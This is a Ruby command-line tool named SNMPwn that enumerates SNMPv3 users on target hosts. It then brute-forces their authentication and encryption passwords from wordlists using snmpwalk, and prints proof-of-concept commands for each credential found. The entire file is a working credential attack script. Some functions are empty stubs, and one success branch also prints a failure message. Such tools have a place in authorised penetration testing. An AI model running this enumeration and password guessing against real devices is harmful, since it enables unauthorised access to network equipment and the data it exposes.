#!/usr/bin/env ruby
#SNMPwn
#SNMPv3 User Enumeration and Password Attack Script

require 'tty-command'
require 'trollop'
require 'colorize'
require 'logger'
require 'text-table'

def arguments

  opts = Trollop::options do 
    version "snmpwn v0.96b".light_blue
    banner <<-EOS
    snmpwn v0.96b
      EOS

        opt :hosts, "SNMPv3 Server IP", :type => String #change to accept lists of hosts too
        opt :enum_users, "Emumerate SNMPv3 Users?" #may remove, not currently using
        opt :users, "List of users you want to try", :type => String
        opt :passlist, "Password list for attacks", :type => String
        opt :enclist, "Encryption Password List for AuthPriv types", :type => String
        opt :timeout, "Specify Timeout, for example 0.2 would be 200 milliseconds. Default 0.3", :default => 0.3
        opt :showfail, "Show failed password attacks"

        if ARGV.empty?
          puts "Need Help? Try ./snmpwn --help".red.bold
        exit
      end
    end
  opts
end

def findusers(arg, hostfile, cmd)
  users = []
  userfile = File.readlines(arg[:users]).map(&:chomp)
  
  puts "\nEnumerating SNMPv3 users".light_blue.bold
  hostfile.each do |host|
    userfile.each do |user|
      out, err = cmd.run!("snmpwalk -u #{user} #{host} iso.3.6.1.2.1.1.1.0")
        if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:/i
          puts "FOUND: '#{user}' on #{host}".green.bold
          users << [user, host]
        elsif err =~ /authorizationError/i
          puts "FOUND: '#{user}' on #{host}".green.bold
          users << [user, host]
        elsif err =~ /snmpwalk: Unknown user name/i
          puts "FAILED: '#{user}' on #{host}".red.bold
        end
      end
    end
  if !users.empty?
  puts "\nValid Users:".green.bold
  puts users.to_table(:head => ['User', 'Host'])
  users.each { |user| user.pop }.uniq!.flatten!.sort!
  end
  users
end

def noauth(arg, users, hostfile, cmd)
  results = []
  results << ["User", "Host"]
  encryption_pass = File.readlines(arg[:enclist]).map(&:chomp)

  puts "\nTesting SNMPv3 without authentication and encryption".light_blue.bold
  hostfile.each do |host|
    users.each do |user|   
      out, err = cmd.run!("snmpwalk -u #{user} #{host} iso.3.6.1.2.1.1.1.0")
        if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:/i
          puts "'#{user}' can connect without a password to host #{host}".green.bold
          puts "POC ---> snmpwalk -u #{user} #{host}".light_magenta
          results << [user, host]
      end
    end
  end
  results
end

def authnopriv(arg, users, hostfile, passwords, cmd)
  results = []
  results << ["User", "Host", "Password"]

  puts "\nTesting SNMPv3 with authentication and without encryption".light_blue.bold
  hostfile.each do |host|
    users.each do |user|
      passwords.each do |password|
        if password.length >= 8
          out, err = cmd.run!("snmpwalk -u #{user} -A #{password} #{host} -v3 iso.3.6.1.2.1.1.1.0 -l authnopriv")
            if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:/i
              puts "'#{user}' can connect with the password '#{password}'".green.bold
              puts "POC ---> snmpwalk -u #{user} -A #{password} #{host} -v3 -l authnopriv".light_magenta
              results << [user, host, password]
          end
        end
      end
    end
  end
  results
end

def authpriv_md5des(arg, users, hostfile, passwords, cmd, cryptopass)
  valid = []
  valid << ["User", "Password", "Encryption", "Host"]

  puts "\nTesting SNMPv3 with MD5 authentication and DES encryption".light_blue.bold
  hostfile.each do |host|
    users.each do |user|
      passwords.each do |password|
        cryptopass.each do |epass|
          if epass.length >= 8 && password.length >= 8
            out, err = cmd.run!("snmpwalk -u #{user} -A #{password} -X #{epass} #{host} -v3 iso.3.6.1.2.1.1.1.0 -l authpriv", timeout: arg[:timeout])
              if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:/i
                puts "FOUND: Username:'#{user}' Password:'#{password}' Encryption password:'#{epass}' Host:#{host}, MD5/DES".green.bold
                puts "POC ---> snmpwalk -u #{user} -A #{password} -X #{epass} #{host} -v3 -l authpriv".light_magenta
                valid << [user, password, epass, host]
              else
                puts "FAILED: Username:'#{user}' Password:'#{password}' Encryption password:'#{epass}' Host:#{host}".red.bold
            end
          end
        end
      end
    end
  end
  valid
end


def authpriv_md5aes(arg, users, hostfile, passwords, cmd, cryptopass)
  valid = []
  valid << ["User", "Password", "Encryption", "Host"]

  puts "\nTesting SNMPv3 with MD5 authentication and AES encryption".light_blue.bold
  hostfile.each do |host|
    users.each do |user|
      passwords.each do |password|
        cryptopass.each do |epass|
          if epass.length >= 8 && password.length >= 8
            out, err = cmd.run!("snmpwalk -u #{user} -A #{password} -a MD5 -X #{epass} -x AES #{host} -v3 iso.3.6.1.2.1.1.1.0 -l authpriv", timeout: arg[:timeout])
                if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:/i
                  puts "FOUND: Username:'#{user}' Password:'#{password}' Encryption password:'#{epass}' Host:#{host}, MD5/AES".green.bold
                  puts "POC ---> snmpwalk -u #{user} -A #{password} -a MD5 -X #{epass} -x AES #{host} -v3 -l authpriv".light_magenta
                  puts "FAILED: Username:'#{user}' Password:'#{password}' Encryption password:'#{epass}' Host:#{host}".red.bold
                  valid << [user, password, epass, host]
                else
                puts "FAILED: Username:'#{user}' Password:'#{password}' Encryption password:'#{epass}' Host:#{host}".red.bold
            end
          end
        end
      end
    end
  end
  valid
end

def authpriv_shades
end

def authpriv_shaaes
end

def print(users, no_auth, anp, ap, apaes)
  #need to get the user summary working to show IPs too
  puts "\nResults Summary:\n".green.bold
  puts "Valid Users Per System:".magenta
  puts users.to_table
  puts "\nAccounts that did not require a password to connect!".magenta
  puts no_auth.to_table(:first_row_is_head => true)
  puts "\nAccount and password (No encryption configured - BAD)".magenta
  puts anp.to_table(:first_row_is_head => true)
  puts "\nAccount and password (MD5 Auth and DES Encryption - Should use AES)".magenta
  puts ap.to_table(:first_row_is_head => true)
  puts "\nAccount and password (MD5 Auth and AES Encryption - Not too shabby, recommend SHA for auth!".magenta
  puts apaes.to_table(:first_row_is_head => true)
end


arg = arguments
hostfile = File.readlines(arg[:hosts]).map(&:chomp)
passwords = File.readlines(arg[:passlist]).map(&:chomp)
cryptopass = File.readlines(arg[:enclist]).map(&:chomp)
log = Logger.new('debug.log')
cmd = TTY::Command.new(output: log)
users = findusers(arg, hostfile, cmd)
no_auth = noauth(arg, users, hostfile, cmd)
anp = authnopriv(arg, users, hostfile, passwords, cmd)
ap = authpriv_md5des(arg, users, hostfile, passwords, cmd, cryptopass)
apaes = authpriv_md5aes(arg, users, hostfile, passwords, cmd, cryptopass)
print(users, no_auth, anp, ap, apaes)